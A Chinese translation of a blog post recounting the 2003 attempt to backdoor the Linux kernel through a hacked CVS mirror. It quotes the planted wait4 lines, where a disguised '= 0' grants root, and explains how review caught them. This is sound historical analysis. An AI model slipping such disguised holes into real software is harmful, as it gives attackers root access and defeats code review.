揭秘！—— 2003年Linux后门事件
==================================

最近Josh写了[一篇文章][1]，讲述2006年Debian Linux中出现的一系列安全bug，探讨了这些所谓bug是否是NSA植入的后门。（最后他作出结论：可能不是）

今天我想讲述的是另外一个[事件][2]——2003年某些人试图在Linux内核中植入后门的故事。这次事件很明确，的确有人想植入后门，只是我们不知道此人是谁，而且，也许永远都不会知道了。

时间回到2003年，当时Linux使用一套叫做BitKeeper的系统来存储Linux源代码的主拷贝。如果开发者想要提交一份针对源码的修改，就必须经过一套严格的审核过程，以决定这份修改是否能够合并进主拷贝。每个针对主拷贝的修改都必须附带一段说明，说明当中都包括了一个记录相应审核过程的链接。

但是有些人不喜欢BitKeeper，于是这些开发者们就用另一套叫做CVS的系统，维护了一份Linux源代码的拷贝，这样他们就能随时按自己喜欢的方式获取Linux源代码了。CVS中的代码其实就是直接克隆了BitKeeper中的代码。

但是在2003年11月5日的时候，Larry McVoy[发现][3]，CVS中的代码拷贝有一处改动并没有包含记录审核的链接。调查显示，这一处改动由陌生人添加，而且从未经过审核，不仅如此，在BitKeeper仓库的主拷贝中，这一处改动竟然压根就不存在。经过进一步调查后，可以明确，显然有人入侵了CVS的服务器并植入了此处改动。

神秘人物究竟做了哪些改动？这才是真正有趣的地方。改动修改的是Linux中一个叫wait4的函数，程序可以使用该函数进行挂起操作，以等待某些事件的触发。神秘人物添加的，就是下面这两行代码：

	if ((options == (__WCLONE|__WALL)) && (current->uid = 0))
        retval = -EINVAL;
        
[有C语言编程经验的人也许会问：这两行代码有什么特别的？请接着往下看]

猛地一看，好像这两行代码就是一段正常的错误校验代码，当wait4函数被某种文档中禁止的方式调用时，wait4就返回一个错误代码。但是一个真正认真的程序猿立刻就会发现代码中的问题，注意看在第一行末尾，“= 0”应该是“== 0”才对。是的，“== 0”在这里才是判断当前运行代码的用户ID(current->uid)是否等于0，而“= 0”不但无法判断，反而修改了用户ID的值，即，将其值赋值为0。

将用户ID设置为0，这是一个很严重的问题，因为ID为0的用户正是“root”，而root账户可以在系统中做任何事情，包括访问所有数据、修改任意代码的行为，能够危及到整个系统各个部分的安全。因此，这段代码的影响就是通过特殊手段使得任何调用wait4函数的软件都拥有了root权限。换句话说，这就是一个典型的后门。

客观地说，这一招很漂亮。看起来就像是无关紧要的错误校验，但真是身份却是一个后门。而且它混在其他经过审核的代码中间，几乎规避了所有审核可能会注意到自己的可能性。

但是它终究还是失败了，因为Linux小组有足够强的责任心，注意到了CVS仓库中的这段代码没有经过常规审核。Linux还是略胜一筹。

这是NSA干的吗？只能说有可能。因为有太多拥有技术能力和动机的人有可能实施了此次攻击。那么，到底是谁呢？除非某些人主动承认，又或者发现新的确凿证据，否则，我们将永远不会知道。

---

via: https://freedom-to-tinker.com/blog/felten/the-linux-backdoor-attempt-of-2003/

本文由 [LCTT][] 原创翻译，[Linux中国][] 荣誉推出

译者：[Mr小眼儿][] 校对：[校对者ID][]

[LCTT]:https://github.com/LCTT/TranslateProject
[Linux中国]:http://linux.cn/portal.php
[Mr小眼儿]:http://linux.cn/space/14801
[校对者ID]:http://linux.cn/space/校对者ID

[1]:https://freedom-to-tinker.com/blog/kroll/software-transparency-debian-openssl-bug/
[2]:https://lwn.net/Articles/57135/
[3]:https://lwn.net/Articles/57137/